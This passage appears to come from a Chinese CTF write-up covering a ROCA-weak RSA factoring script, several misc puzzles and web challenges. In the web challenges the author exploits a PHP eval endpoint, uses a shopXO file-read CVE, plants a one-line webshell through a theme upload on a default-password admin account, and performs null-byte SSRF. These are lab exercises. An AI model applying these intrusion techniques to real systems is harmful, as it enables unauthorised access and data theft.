base64.b64encode(rsa_encrypt(flag))\n    with open('flag.enc','wb') as f:\n        f.write(text)\n</code></pre>\n<p>google 后发现是 CVE-2017-15361，<span class=\"exturl\" data-url=\"aHR0cHM6Ly9tZWRpdW0uY29tL2FzZWN1cml0eXNpdGUtd2hlbi1ib2ItbWV0LWFsaWNlL3NvLXdoYXQtd2FzLXRoZS1wcm9ibGVtLXdpdGgtdGhlLWVzdG9uaWFuLWlkLXN5c3RlbS1hbmQtdHBtcy0xZWYwMmE5YmRlN2Y=\">那么爱沙尼亚身份证系统和 TPM 的问题是什么？弱素数生成器（和 RSA！ | 作者：比尔・布坎南教授 OBE |A 安全网站：当鲍勃遇见爱丽丝 | 中等 (medium.com)</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9hc2VjdXJpdHlzaXRlLmNvbS9lbmNyeXB0aW9uL2NvcHBlcg==\">弱素数生成器 （RSALib） (asecuritysite.com)</span></p>\n<p>其中 <em>k</em> 和 <em>a</em> 是破解时的未知整数。<em>M</em> 是前 n 个素数的乘法。</p>\n<p>n 的素数因子 p 是由这个公式得出的</p>\n<pre><code class=\"language-python\">from Crypto.Util import number\n\nk=3\nvals=39\na=12\nM=1\n\nprimes = [2, 3, 5, 7, 11, 13, 17, 19, 23, 29, 31, 37, 41, 43, 47, 53, 59, 61, 67, 71, 73, 79, 83, 89, 97, 101, 103, 107, 109, 113, 127, 131, 137, 139, 149, 151, 157, 163, 167, 173, 179, 181, 191, 193, 197, 199, 211, 223, 227, 229, 233, 239, 241, 251, 257, 263, 269, 271, 277, 281, 283, 293, 307, 311, 313, 317, 331, 337, 347, 349, 353, 359, 367, 373, 379, 383, 389, 397, 401, 409, 419, 421, 431, 433, 439, 443, 449, 457, 461, 463, 467, 479, 487, 491, 499, 503, 509, 521, 523, 541, 547, 557, 563, 569, 571, 577, 587, 593, 599, 601, 607, 613, 617, 619, 631, 641, 643, 647, 653, 659, 661, 673, 677, 683, 691, 701, 709, 719, 727, 733, 739, 743, 751, 757, 761, 769, 773, 787, 797, 809, 811, 821, 823, 827, 829, 839, 853, 857, 859, 863, 877, 881, 883, 887, 907, 911, 919, 929, 937, 941, 947, 953, 967, 971, 977, 983, 991, 997, 1009, 1013, 1019, 1021, 1031, 1033, 1039, 1049, 1051, 1061, 1063, 1069, 1087, 1091, 1093, 1097, 1103, 1109, 1117, 1123, 1129, 1151, 1153, 1163, 1171, 1181, 1187, 1193, 1201, 1213, 1217, 1223, 1229, 1231, 1237, 1249, 1259, 1277, 1279, 1283, 1289, 1291, 1297, 1301, 1303, 1307, 1319, 1321, 1327, 1361, 1367, 1373, 1381, 1399, 1409, 1423, 1427, 1429, 1433, 1439, 1447, 1451, 1453, 1459, 1471, 1481, 1483, 1487, 1489, 1493, 1499, 1511, 1523, 1531, 1543, 1549, 1553, 1559, 1567, 1571, 1579, 1583, 1597, 1601, 1607, 1609, 1613, 1619, 1621, 1627, 1637, 1657, 1663, 1667, 1669, 1693, 1697, 1699, 1709, 1721, 1723, 1733, 1741, 1747, 1753, 1759, 1777, 1783, 1787, 1789, 1801, 1811, 1823, 1831, 1847, 1861, 1867, 1871, 1873, 1877, 1879, 1889, 1901, 1907, 1913, 1931, 1933, 1949, 1951, 1973, 1979, 1987, 1993, 1997, 1999, 2003, 2011, 2017, 2027, 2029, 2039, 2053, 2063, 2069, 2081, 2083, 2087, 2089, 2099, 2111, 2113, 2129, 2131, 2137, 2141, 2143, 2153, 2161, 2179, 2203, 2207, 2213, 2221, 2237, 2239, 2243, 2251, 2267, 2269, 2273, 2281, 2287, 2293, 2297, 2309, 2311, 2333, 2339, 2341, 2347, 2351, 2357, 2371, 2377, 2381, 2383, 2389, 2393, 2399, 2411, 2417, 2423, 2437, 2441, 2447, 2459, 2467, 2473, 2477, 2503, 2521, 2531, 2539, 2543, 2549, 2551, 2557, 2579, 2591, 2593, 2609, 2617, 2621, 2633, 2647, 2657, 2659, 2663, 2671, 2677, 2683, 2687, 2689, 2693, 2699, 2707, 2711, 2713, 2719, 2729, 2731, 2741, 2749, 2753, 2767, 2777, 2789, 2791, 2797, 2801, 2803, 2819, 2833, 2837, 2843, 2851, 2857, 2861, 2879, 2887, 2897, 2903, 2909, 2917, 2927, 2939, 2953, 2957, 2963, 2969, 2971, 2999]\n\nfor x in range(0, vals):\n    M=M*primes[x]\n\np=k*M+(65537**a %M)\nprint('k=',k)\nprint('a=',a)\nprint('Number of prime numbers used=',vals)\nprint('======')\n\nprint('M=',M)\nprint('\\nPrime=',p)\n\nisp = number.isPrime(p)\nif (isp==1):\n\tprint('Value is prime')\nelse:\n\tprint('Value is not prime')\n</code></pre>\n<p>通过 pub.pwm 来获取 e 和 n</p>\n<pre><code class=\"language-python\">with open('./pub.pem' ,'r') as f:\n    key = RSA.import_key(f.read())\n    e = key.e\n    n = key.n\n#e=65535\n#n=15518961041625074876182404585394098781487141059285455927024321276783831122168745076359780343078011216480587575072479784829258678691739\n</code></pre>\n<p>这里的 n 是 134 位，预估 p 的位数不超过 134/2=67 位，M 代表前 x 项素数的乘积， x 的可选值有 5，16，39，71，80，126。在参数 k 与 a 取值不大的情况下，选取不同的 x 值，得到的 p 的位数不同。</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304041614575.png\" alt=\"image-20230404161441453\" /></p>\n<p>这里爆破一下求得 pq</p>\n<pre><code>import gmpy2\nM=962947420735983927056946215901134429196419130606213075415963491270\nn=15518961041625074876182404585394098781487141059285455927024321276783831122168745076359780343078011216480587575072479784829258678691739\n\nfor k in range(100):\n\tfor a in range(100):\n\t\tp=k*M+(65537**a %M)\n\t\tif n%p==0:\n\t\t\tprint('k=',k)\n\t\t\tprint('a=',a)\n\t\t\tprint('Prime=',p)\n\t\t\tisp = gmpy2.is_prime(p)\n</code></pre>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304041616242.png\" alt=\"image-20230404161647184\" /></p>\n<pre><code class=\"language-python\">from gmpy2 import *\nimport libnum\n\nn = 15518961041625074876182404585394098781487141059285455927024321276783831122168745076359780343078011216480587575072479784829258678691739\ne = 65537\np = 3386619977051114637303328519173627165817832179845212640767197001941\nq = 4582433561127855310805294456657993281782662645116543024537051682479\nc = int(&quot;02142af7ce70fe0ddae116bb7e96260274ee9252a8cb528e7fdd29809c2a6032727c05526133ae4610ed944572ff1abfcd0b17aa22ef44a2&quot;,16)\n\nN = (p-1)*(q-1)\nd = invert(e,N)\nm = pow(c,d,n)\n# print(d)\nprint(libnum.n2s(int(m)))\n#b'flag&#123;760958c9-cca9-458b-9cbe-ea07aa1668e4&#125;'\n</code></pre>\n<h2 id=\"misc\"><a class=\"anchor\" href=\"#misc\">#</a> Misc</h2>\n<h3 id=\"pokémon\"><a class=\"anchor\" href=\"#pokémon\">#</a> Pokémon</h3>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZW11bGF0b3Item9uZS5jb20vZG9jLnBocC9nYmEvdmJveWFkdmFuY2UuaHRtbA==\">Visual Boy Advance (emulator-zone.com)</span></p>\n<p>玩这个游戏，到 103 号路口就行，纯娱乐</p>\n<h3 id=\"code-obfuscation\"><a class=\"anchor\" href=\"#code-obfuscation\">#</a> code obfuscation</h3>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304041752507.png\" alt=\"image-20230404175252420\" /></p>\n<p>将图片拉伸一下</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304041753123.png\" alt=\"image-20230404175317080\" /></p>\n<p>补一下这个图</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304041756324.png\" alt=\"image-20230404175641276\" /></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304041757333.png\" alt=\"image-20230404175700284\" /></p>\n<p>这里用 binwalk -e 分解后得到一个 rar</p>\n<p>将上面 gkctf 进行 base58 编码后可以打开压缩包</p>\n<p>打开后图片内容</p>\n<pre><code class=\"language-perl\">$Bn$Ai$An$Ac$Al$Au$Ad$Ae$Bk$Cc$As$At$Ad$Ai$Ao$By$Ah$Ce\n$Ai$An$At$Bk$Am$Aa$Ai$Bs$Bt$Cn\n$Ap$Ar$Ai$An$At$Bs$Bm$Aw$Dd$Al$Ac$Da$Am$Ae$Cl$De$Ao$Cl$Dj$Ak$Ac$At$Df$Bm$Bt$Cb\n$Ar$Ae$At$Au$Ar$An$Bk$Da$Cb\n$Cp\n</code></pre>\n<p>1 文件内容</p>\n<pre><code class=\"language-perl\">eval(function(p,a,c,k,e,d)&#123;e=function(c)&#123;return(c&lt;a?&quot;&quot;:e(parseInt(c/a)))+((c=c%a)&gt;35?String.fromCharCode(c+29):c.toString(36))&#125;;if(!''.replace(/^/,String))&#123;while(c--)d[e(c)]=k[c]||e(c);k=[function(e)&#123;return d[e]&#125;];e=function()&#123;return'\\\\w+'&#125;;c=1;&#125;;while(c--)if(k[c])p=p.replace(new RegExp('\\\\b'+e(c)+'\\\\b','g'),k[c]);return p;&#125;('15 n 14 a b c d e f g h i j k l m n o p q r s t u v w x y z 10 11 17=&quot;n&quot;12 15 n 14 A B C D E F G H I J K L M N O P Q R S T U V W X Y Z 10 11 17=&quot;n&quot;12 13=0 15 n 14 a b c d e f g h i j 10 11 16=&quot;n&quot;13=$((13+1))12 1g(&quot;1f=\\' \\';1e=\\'&quot;\\';16=\\'#\\';1j=\\'(\\';1i=\\')\\';1h=\\'.\\';1a=\\';\\';19=\\'&lt;\\';18=\\'&gt;\\';1d=\\'1c\\';1b=\\'&#123;\\';1k=\\'&#125;\\';1t=\\'0\\';1u=\\'1\\';1s=\\'2\\';1r=\\'3\\';1n=\\'4\\';1m=\\'5\\';1l=\\'6\\';1q=\\'7\\';1p=\\'8\\';1o=\\'9\\';&quot;)',62,93,'||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||do|eval|done|num|in|for|Bn|An|Ce|Cc|Cb|Cn|_|Cl|Bm|Bk|alert|By|Bt|Bs|Cp|Dg|Df|De|Dj|Di|Dh|Dd|Dc|Da|Db'.split('|'),0,&#123;&#125;))\n\n</code></pre>\n<p>这里用的是网上找到的脚本</p>\n<pre><code class=\"language-python\">import string\ns = &quot;$Bn$Ai$An$Ac$Al$Au$Ad$Ae$Bk$Cc$As$At$Ad$Ai$Ao$By$Ah$Ce$Ai$An$At$Bk$Am$Aa$Ai$An$Bs$Bt$Cn$Ap$Ar$Ai$An$At$Bs$Bm$Aw$Dd$Al$Ac$Da$Am$Ae$Cl$De$Ao$Cl$Dj$Ak$Ac$At$Df$Bm$Bt$Cb$Ar$Ae$At$Au$Ar$An$Bk$Da$Cb$Cp&quot;\nll = s.split('$')\nlist1 = ['Bk','Bm','Bn','Bs','Bt','By','Cb','Cc','Ce','Cl','Cn','Cp',\n'Da','Db','Dc','Dd','De','Df','Dg','Dh','Di','Dj']\nlist2 = [' ','&quot;','#','(',')','.','','&lt;','&gt;','_','&#123;','&#125;','0','1','2','3','4','5','6','7','8','9']\nlist3 = []\nlist4 = []\ns = string.ascii_lowercase\nfor i in s:\n\tlist3.append('A%s'%i)\n\tlist4.append(i)\n#print(list3,'\\n',list4)\n\nt = ''\nfor i in range(0,len(ll)):\n\tfor j in range(0,len(list1)):\n\t\tif ll[i]==list1[j]:\n\t\t\tt += list2[j]\n\tfor k in range(0,len(list3)):\n\t\tif ll[i]==list3[k]:\n\t\t\tt +=list4[k]\nprint(t)\n#include &lt;stdio.h&gt;int main()&#123;print(&quot;w3lc0me_4o_9kct5&quot;)return 0&#125;\n</code></pre>\n<h3 id=\"harley-quinn\"><a class=\"anchor\" href=\"#harley-quinn\">#</a> Harley Quinn</h3>\n<p>这题放了两个 hint，看起来当时开始的时候做出来的人还是不多的</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304042357129.png\" alt=\"image-20230404235705038\" /></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304042357970.png\" alt=\"image-20230404235716937\" /></p>\n<p>音频到结尾部分，有电话音的声音，用工具 dtmf2num 进行破解：</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304050010205.png\" alt=\"image-20230405001023160\" /></p>\n<p>#22283334447777338866#</p>\n<p>对应 9 建</p>\n<pre><code class=\"language-perl\">ctfisfun\n</code></pre>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304050021579.png\" alt=\"image-20230405002121528\" /></p>\n<p>根据提示使用 FreeFileCamouflage 破解</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304050021405.png\" alt=\"image-20230405002156367\" /></p>\n<h3 id=\"sail-a-boat-down-the-river\"><a class=\"anchor\" href=\"#sail-a-boat-down-the-river\">#</a> Sail a boat down the river</h3>\n<p>三解，三个 hint，当时的题还是很绕的</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304050024187.png\" alt=\"image-20230405002442142\" /></p>\n<pre><code class=\"language-perl\">Hint:\n闪烁的光芒\n是一行不是一列\n加密方式很常见\n</code></pre>\n<p>根据提示在 <code>118帧-130帧</code> 、 <code>200帧-208帧</code> 、 <code>320帧-334帧</code> 、 <code>410帧-418帧</code> 刷卡器出现闪光，摩斯密码</p>\n<pre><code>-.-- .-- ---.. --.\n</code></pre>\n<p>解出得 yw8g</p>\n<p>在 15 秒看到一张二维码</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304050032246.png\" alt=\"image-20230405003255656\" /></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304050035420.png\" alt=\"image-20230405003538176\" /></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9wYW4uYmFpZHUuY29tL3MvMXR5Z3QwTm1fRzVmVGZWRmxneFZjclE=\">https://pan.baidu.com/s/1tygt0Nm_G5fTfVFlgxVcrQ</span></p>\n<p>输入上面得到的密码</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304050036502.png\" alt=\"image-20230405003637459\" /></p>\n<p>密钥解熟读，然后根据排序即可得到： <code>52693795149137</code> <span class=\"exturl\" data-url=\"aHR0cDovL3huLS1HRzBrYy02bzZocjY4Y2xnaGs0NmgudGY=\"> 解密得到 GG0kc.tf</span></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304050040420.png\" alt=\"image-20230405004030369\" /></p>\n<p>使用 <code>Overture</code>  打开得到 flag</p>\n<h2 id=\"web\"><a class=\"anchor\" href=\"#web\">#</a> Web</h2>\n<h3 id=\"checkin\"><a class=\"anchor\" href=\"#checkin\">#</a> CheckIN</h3>\n<pre><code class=\"language-php\">&lt;title&gt;Check_In&lt;/title&gt;\n&lt;?php \nhighlight_file(__FILE__);\nclass ClassName\n&#123;\n        public $code = null;\n        public $decode = null;\n        function __construct()\n        &#123;\n                $this-&gt;code = @$this-&gt;x()['Ginkgo'];\n                $this-&gt;decode = @base64_decode( $this-&gt;code );\n                @Eval($this-&gt;decode);\n        &#125;\n\n        public function x()\n        &#123;\n                return $_REQUEST;\n        &#125;\n&#125;\nnew ClassName();\n</code></pre>\n<p>这里可以看到，源码很简单，接受参数，base64 解码后 eval 执行，先尝试 phpinfo ()</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304050051333.png\" alt=\"image-20230405005151284\" /></p>\n<p>能够正常执行，但是看到在环境变量中过滤了很多函数</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304050052378.png\" alt=\"image-20230405005239337\" /></p>\n<p>没有过滤 eval 函数，尝试构造木马用蚁剑连接后，发现不能正常运行命令，使用插件绕过</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304050058842.png\" alt=\"image-20230405005812789\" /></p>\n<h3 id=\"老八小超市儿\"><a class=\"anchor\" href=\"#老八小超市儿\">#</a> 老八小超市儿</h3>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304051506808.png\" alt=\"image-20230405150623656\" /></p>\n<p>发现是 shopXO 电商系统，基于 thinkphp 开发的，去搜 CVE<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ4OTg1NzgwL2FydGljbGUvZGV0YWlscy8xMjIyMTgwOTE=\"> (71 条消息) shopxo 文件读取（CNVD-2021-15822）_xzhome 的博客 - CSDN 博客</span></p>\n<p>这里直接用 poc 读取跟目录下面的 flag</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304051513091.png\" alt=\"image-20230405151307037\" /></p>\n<p>提示 flag 在 root 下面尝试读取发现 return 500 估计是权限问题，看来还得找别的 cve，看了下版本是 1.8</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304051508840.png\" alt=\"image-20230405150840800\" /></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9jbG91ZC50ZW5jZW50LmNvbS9kZXZlbG9wZXIvYXJ0aWNsZS8yMDk5NDAw\">渗透测试 | shopxo 后台全版本获取 shell 复现 - 腾讯云开发者社区 - 腾讯云 (tencent.com)</span> 这里看到需要先登录，尝试发现没有改默认密码</p>\n<p>这里直接搜索主题</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304051521200.png\" alt=\"image-20230405152129091\" /></p>\n<p>下载后添加一句话木马</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304051534023.png\" alt=\"image-20230405153407978\" /></p>\n<p>再上传回去</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304051535230.png\" alt=\"image-20230405153555190\" /></p>\n<p>这里直接添加</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304051541059.png\" alt=\"image-20230405154104996\" /></p>\n<p>用蚂蚁剑连接上后确实访问不了这个 root 目录</p>\n<p><img data-src=\"C:%5CUsers%5C%E9%99%8C%E8%B7%AF%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230405154225020.png\" alt=\"image-20230405154225020\" /></p>\n<p>看到根目录还有一个 hint</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304051543047.png\" alt=\"image-20230405154340012\" /></p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL3huLS1hdXRvLXBtOWZsOGZveDNoLnNo\">又看到 auto.sh</span></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304051544829.png\" alt=\"image-20230405154429791\" /></p>\n<p>没 60 秒刷新一次，那修改一下这个脚本就可以了</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304051548419.png\" alt=\"image-20230405154814376\" /></p>\n<p>然后去读 flag.hint 就可以了</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304051549681.png\" alt=\"image-20230405154912635\" /></p>\n<h3 id=\"cve版签到\"><a class=\"anchor\" href=\"#cve版签到\">#</a> cve 版签到</h3>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304051554551.png\" alt=\"image-20230405155402510\" /></p>\n<p>cve 编号有了，看来简单复现一下就行 [<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vS3kxMjI2L3AvMTQzMzIxMTAuaHRtbA==\">代码审计] CVE-2020-7066 漏洞复现 - Ky1226 - 博客园 (cnblogs.com)</span></p>\n<p>简答来说 get_headers () 会截断 URL 中空字符后的内容</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304051558787.png\" alt=\"image-20230405155808748\" /></p>\n<p>点击后多了一个 url</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304051557371.png\" alt=\"image-20230405155759326\" /></p>\n<p>看起来是 SSRF，通过 %00 截断然后访问本地 ip</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304051608881.png\" alt=\"image-20230405160815831\" /></p>\n<p>要以 123 结尾</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304051608003.png\" alt=\"image-20230405160845950\" /></p>\n<h3 id=\"ez三剑客-eznode\"><a class=\"anchor\" href=\"#ez三剑客-eznode\">#</a> EZ 三剑客 - EzNode</h3>\n<p>看到首页</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304051614492.png\" alt=\"image-20230405161417448\" /></p>\n<p>版本</p>\n<pre><code class=\"language-perl\">&#123;\n  &quot;name&quot;: &quot;src&quot;,\n  &quot;version&quot;: &quot;1.0.0&quot;,\n  &quot;main&quot;: &quot;index.js&quot;,\n  &quot;license&quot;: &quot;MIT&quot;,\n  &quot;dependencies&quot;: &#123;\n    &quot;body-parser&quot;: &quot;1.19.0&quot;,\n    &quot;express&quot;: &quot;4.17.1&quot;,\n    &quot;safer-eval&quot;: &quot;1.3.6&quot;\n  &#125;\n&#125;\n</code></pre>\n<p>源码</p>\n<figure class=\"highlight js\"><figcaption data-lang=\"JavaScript\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">const</span> express <span class=\"token operator\">=</span> <span class=\"token function\">require</span><span class=\"token punctuation\">(</span><span class=\"token string\">'express'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">const</span> bodyParser <span class=\"token operator\">=</span> <span class=\"token function\">require</span><span class=\"token punctuation\">(</span><span class=\"token string\">'body-parser'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">const</span> saferEval <span class=\"token operator\">=</span> <span class=\"token function\">require</span><span class=\"token punctuation\">(</span><span class=\"token string\">'safer-eval'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 2019.7/WORKER1 找到一个很棒的库</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">const</span> fs <span class=\"token operator\">=</span> <span class=\"token function\">require</span><span class=\"token punctuation\">(</span><span class=\"token string\">'fs'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">const</span> app <span class=\"token operator\">=</span> <span class=\"token function\">express</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>app<span class=\"token punctuation\">.</span><span class=\"token function\">use</span><span class=\"token punctuation\">(</span>bodyParser<span class=\"token punctuation\">.</span><span class=\"token function\">urlencoded</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">&#123;</span> <span class=\"token literal-property property\">extended</span><span class=\"token operator\">:</span> <span class=\"token boolean\">false</span> <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>app<span class=\"token punctuation\">.</span><span class=\"token function\">use</span><span class=\"token punctuation\">(</span>bodyParser<span class=\"token punctuation\">.</span><span class=\"token function\">json</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token comment\">// 2020.1/WORKER2 老板说为了后期方便优化</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>app<span class=\"token punctuation\">.</span><span class=\"token function\">use</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">req<span class=\"token punctuation\">,</span> res<span class=\"token punctuation\">,</span> next</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>req<span class=\"token punctuation\">.</span>path <span class=\"token operator\">===</span> <span class=\"token string\">'/eval'</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token keyword\">let</span> delay <span class=\"token operator\">=</span> <span class=\"token number\">60</span> <span class=\"token operator\">*</span> <span class=\"token number\">1000</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>delay<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>Number<span class=\"token punctuation\">.</span><span class=\"token function\">isInteger</span><span class=\"token punctuation\">(</span><span class=\"token function\">parseInt</span><span class=\"token punctuation\">(</span>req<span class=\"token punctuation\">.</span>query<span class=\"token punctuation\">.</span>delay<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>      delay <span class=\"token operator\">=</span> Math<span class=\"token punctuation\">.</span><span class=\"token function\">max</span><span class=\"token punctuation\">(</span>delay<span class=\"token punctuation\">,</span> <span class=\"token function\">parseInt</span><span class=\"token punctuation\">(</span>req<span class=\"token punctuation\">.</span>query<span class=\"token punctuation\">.</span>delay<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token keyword\">const</span> t <span class=\"token operator\">=</span> <span class=\"token function\">setTimeout</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token function\">next</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> delay<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token comment\">// 2020.1/WORKER3 老板说让我优化一下速度，我就直接这样写了，其他人写了啥关我 p 事</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token function\">setTimeout</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>      <span class=\"token function\">clearTimeout</span><span class=\"token punctuation\">(</span>t<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>      console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">'timeout'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>      <span class=\"token keyword\">try</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>        res<span class=\"token punctuation\">.</span><span class=\"token function\">send</span><span class=\"token punctuation\">(</span><span class=\"token string\">'Timeout!'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>      <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>      <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>    <span class=\"token function\">next</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>app<span class=\"token punctuation\">.</span><span class=\"token function\">post</span><span class=\"token punctuation\">(</span><span 